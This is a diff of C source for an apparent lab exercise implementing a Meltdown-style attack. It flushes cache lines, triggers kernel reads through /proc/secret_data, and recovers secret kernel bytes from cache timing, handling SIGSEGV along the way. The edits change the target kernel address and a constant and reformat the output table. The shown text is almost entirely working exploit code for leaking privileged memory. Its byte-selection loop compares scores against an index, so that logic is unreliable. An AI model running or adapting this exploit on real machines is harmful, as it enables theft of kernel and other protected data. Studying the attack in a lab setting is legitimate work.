@@ -18,7 +18,7 @@
 #define PAGE_SIZE 4096
 #define PROBE_N 256
 #define CACHE_HIT_THRESHOLD 100
-#define DELTA 2048 // to reduce bias toward 0
+#define DELTA 1024 // to reduce bias toward 0
 #define ITER_N 1000
 #define READ_N 10 // number of kernel bytes to read
 
@@ -54,28 +54,29 @@ void probe() {
 
 int main(int argc, char* argv[]) {
 
-	unsigned long kernel_addr = 0xffffffffc01d7000; // address of secret value in kernel space
+	unsigned long kernel_addr = 0xffffffffc03fe000; // address of secret value in kernel space
 
 	// register signal handler for seg fault
 	signal(SIGSEGV, catch_segv);
 
 	/* Same technique as cache-time.c/flush-reload.c */
 
-	// bring kernel data into the cache
 	// open kernel /proc file
 	int fd = open("/proc/secret_data", O_RDONLY);
 	if(fd < 0) {
 		perror("Failed to open /proc file.\n");
 		return -1;
-	}
+	}	
 
-	// initialize the probe_array
+	printf("%-12s %-12s %-12s %-12s %-12s\n", "Byte #", "Guess (char)", "Guess (int)", "Hits", "Total Iterations");
+
 	int c, i, iter;
 	for(c=0; c<READ_N; c++) { // for each char in secret
 		memset(scores, 0, PROBE_N * sizeof(int)); // reset scores
 
 		for(iter=0; iter<ITER_N; iter++) {
 			
+			// initialize the probe_array
 			for(i=0; i<PROBE_N; i++) { // only going down a single column in probe array ; these are the only elements we access
 				probe_array[i * PAGE_SIZE] = 1;	
 			}
@@ -85,6 +86,8 @@ int main(int argc, char* argv[]) {
 				// invalidates and flushes the cache line that contains the address from all caches in the cache hierarchy
 				_mm_clflush(&probe_array[i * PAGE_SIZE]);
 			}		
+			
+			// bring kernel data into the cache
 			int ret = pread(fd, NULL, 0, 0); // triggers the proc_read() function in kernel to be executed
 
 			// creates a checkpoint ; context is saved in sigjump_buf jbuf
@@ -111,7 +114,9 @@ int main(int argc, char* argv[]) {
 		for(i=0; i<PROBE_N; i++) {
 			if(scores[i] > max) max = i;
 		}
-		printf("Guess: %c (%i) ; %i hits out of %i iterations)\n", max, max, scores[max], ITER_N);
+		printf("%-12i %-12c %-12i %-12i %-12i\n", c, max, max, scores[max], ITER_N);
+
+		//printf("Guess: %c (%i) ; %i hits out of %i iterations)\n", max, max, scores[max], ITER_N);
 		kernel_addr++; // move to next char
 	} // c ; end
 
